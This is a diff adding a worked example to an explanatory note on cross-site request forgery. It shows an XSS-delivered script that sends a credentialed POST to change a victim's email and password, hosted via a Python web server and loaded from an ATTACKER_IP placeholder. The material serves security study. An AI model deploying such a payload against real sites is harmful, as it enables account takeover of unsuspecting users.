@@ -2,6 +2,28 @@
 
 ### CSRF is a type of security vulnerability where an attacker tricks a user's web browser into performing an unwanted action on a trusted site where the user is authenticated. This is achieved by exploiting the fact that the browser includes any relevant cookies (credentials) automatically, allowing the attacker to forge and submit unauthorised requests on behalf of the user (through the browser). The attacker's website may contain HTML forms or JavaScript code that is intended to send queries to the targeted web application.
 
+Examples of CSRF exploited with XSS:
+
+### 1) Create and host a JS script
+
+This script, if executed, updates the account of another user if no CSRF protections are present
+
+    fetch('/update_email.php', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type':'application/x-www-form-urlencoded'},
+      body: 'email=pwnedadmin@evil.local&password=pwnedadmin'
+    });
+
+### 2) Host the script
+
+    python3 -m http.server 8000
+
+
+### 3) Inject XSS, then when the intended target triggers the XSS, their password effectively gets reset
+
+    <script src="http://ATTACKER_IP:8000/script.js"></script>
+
 ## Cycle of CSRF
 
 #### 1) The attacker already knows the format of the web application's requests to carry out a particular task and sends a malicious link to the user.
